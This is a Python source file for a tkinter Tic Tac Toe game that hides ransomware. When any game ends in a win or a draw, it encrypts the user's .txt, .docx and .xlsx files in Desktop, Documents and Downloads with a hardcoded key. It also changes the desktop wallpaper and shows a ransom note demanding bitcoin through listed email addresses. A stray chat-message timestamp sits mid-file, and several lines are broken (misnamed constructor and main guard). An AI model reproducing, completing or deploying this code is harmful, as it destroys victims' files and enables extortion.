import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet
import os
import webbrowser
import ctypes
import urllib.request
import requests
import time
import datetime
import subprocess
import threading



class TicTacToe:

    def init(self, master):
        self.master = master
        self.master.title("Tic Tac Toe")
        self.current_player = "X"
        self.board = [["" for _ in range(3)] for _ in range(3)]
        self.buttons = [[None for _ in range(3)] for _ in range(3)]
        for i in range(3):
            for j in range(3):
                self.buttons[i][j] = tk.Button(master, text="", font=("Helvetica", 24), width=3, height=1,
                                               command=lambda row=i, col=j: self.make_move(row, col))
                self.buttons[i][j].grid(row=i, column=j)
    def make_move(self, row, col):
        if self.board[row][col] == "":

            self.board[row][col] = self.current_player

            self.buttons[row][col].config(text=self.current_player)

            if self.check_winner(row, col):

                messagebox.showinfo("Winner!", f"Player {self.current_player} wins!")

                self.reset_board()

                self.run_ransomware()

            elif self.check_draw():

                messagebox.showinfo("Draw", "It's a draw!")

                self.reset_board()

                self.run_ransomware()

            else:

                self.toggle_player()



    def toggle_player(self):

        self.current_player = "O" if self.current_player == "X" else "X"



    def check_winner(self, row, col):

        # Check row

        if self.board[row][0] == self.board[row][1] == self.board[row][2] != "":

            return True

        # Check column

        if self.board[0][col] == self.board[1][col] == self.board[2][col] != "":

            return True

        # Check diagonals

        if (self.board[0][0] == self.board[1][1] == self.board[2][2] != "") or (self.board[0][2] == self.board[1][1] == self.board[2][0] != ""):

            return True

        return False



    def check_draw(self):

        for row in self.board:

            for cell in row:

                if cell == "":

                    return False

        return True



    def reset_board(self):

        for i in range(3):

            for j in range(3):

                self.board[i][j] = ""

                self.buttons[i][j].config(text="")

        self.current_player = "X"



    def run_ransomware(self):

        rw = RansomWare()

        rw.crypt_system()

        rw.change_desktop_background()

        rw.what_is_bitcoin()

        rw.ransom_note()



        t1 = threading.Thread(target=rw.show_ransom_note)



        t1.start()

        print('> RansomWare: Attack completed on target machine and system is encrypted')

        print('> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine')



class RansomWare:

    file_exts = ['txt', 'docx', 'xlsx']



    def init(self):

        self.key = b'SGwBB0g2BUAWB8YfK-BNgSSUWDTfD5PaNTpXshR2zN8='

        self.crypter = Fernet(self.key)

        self.sysRoot = os.path.expanduser('~')

        self.localRoot = r'D:\Coding\Python\RansomWare\RansomWare_Software\localRoot'

        self.publicIP = requests.get('https://api.ipify.org').text



    def crypt_file(self, file_path, encrypted=False):

        with open(file_path, 'rb') as f:

            data = f.read()

            if not encrypted:

                _data = self.crypter.encrypt(data)

                print('> File encrypted')

            else:

                _data = self.crypter.decrypt(data)

                print('> File decrypted')

        with open(file_path, 'wb') as fp:

            fp.write(_data)

Davit, [5/17/24 1:44â€¯PM]
def crypt_system(self, encrypted=False):
        important_extensions = ['.txt', '.docx', '.xlsx']
        important_directories = [
            os.path.join(self.sysRoot, 'Desktop'),
            os.path.join(self.sysRoot, 'Documents'),
            os.path.join(self.sysRoot, 'Downloads'),
        ]

        for directory in important_directories:
            system = os.walk(directory, topdown=True)
            for root, dir, files in system:
                for file in files:
                    file_path = os.path.join(root, file)
                    if file == 'EMAIL_ME.txt':
                        continue
                    if encrypted and any(file.endswith(ext) for ext in important_extensions):
                        self.crypt_file(file_path, encrypted=True)
                    elif not encrypted and any(file.endswith(ext) for ext in important_extensions):
                        self.crypt_file(file_path)




    @staticmethod

    def what_is_bitcoin():

        url = 'https://bitcoin.org'

        webbrowser.open(url)



    def change_desktop_background(self):

        imageUrl = 'https://thehackernews.com/images/-Vahdg_4N61s/Vr75u3cDEFI/AAAAAAAAmrc/ckc4yC_4Kgs/s728-rw-e30/how-to-decrypt-ransomware-files.png'

        path = f'{self.sysRoot}\\Desktop\\background.jpg'

        urllib.request.urlretrieve(imageUrl, path)

        SPI_SETDESKWALLPAPER = 20

        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)



    def ransom_note(self):

        date = datetime.date.today().strftime('%d-%B-Y')

        with open('RANSOM_NOTE.txt', 'w') as f:

            f.write(f'''

Your computer's hard disks have been encrypted using a robust military-grade algorithm, rendering your data inaccessible without a specialized key. Only we possess the capability to decrypt your files.



To initiate the process of recovering your data, please adhere to these simple instructions:



Locate and email the file named EMAIL_ME.txt found at {self.sysRoot}\Desktop\EMAIL_ME.txt to zmense@proton.me

Upon receipt, you will be provided with a unique BTC address for payment. Once the payment transaction is completed, send another email to GetYourFilesBack@protonmail.com confirming your payment by stating "PAID". We will verify your payment status accordingly.

Following confirmation of your payment, you will receive a text file containing your personal KEY, which will enable the decryption of all your files. It is crucial to place this text file on your desktop and await the decryption process, which will commence shortly thereafter.

WARNING:


Under no circumstances should you attempt to decrypt your files using outdated or unauthorized software, as it will prove ineffective and could potentially increase the cost of file recovery.

Avoid altering file names, tampering with the encrypted files, or utilizing decryption tools, as these actions may result in permanent data loss and escalate the cost of recovery.

Failure to submit the "PAID" confirmation without completing the payment will result in an increase in the ransom amount.

Refusal to comply with payment demands may prompt us to permanently delete your files and discard the decryption key.

''')


    def show_ransom_note(self):

        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])

        time.sleep(10)  


    def put_me_on_desktop(self):

        pass


def main():

    root = tk.Tk()

    game = TicTacToe(root)

    root.mainloop()



if __name == '__main__':

    main()
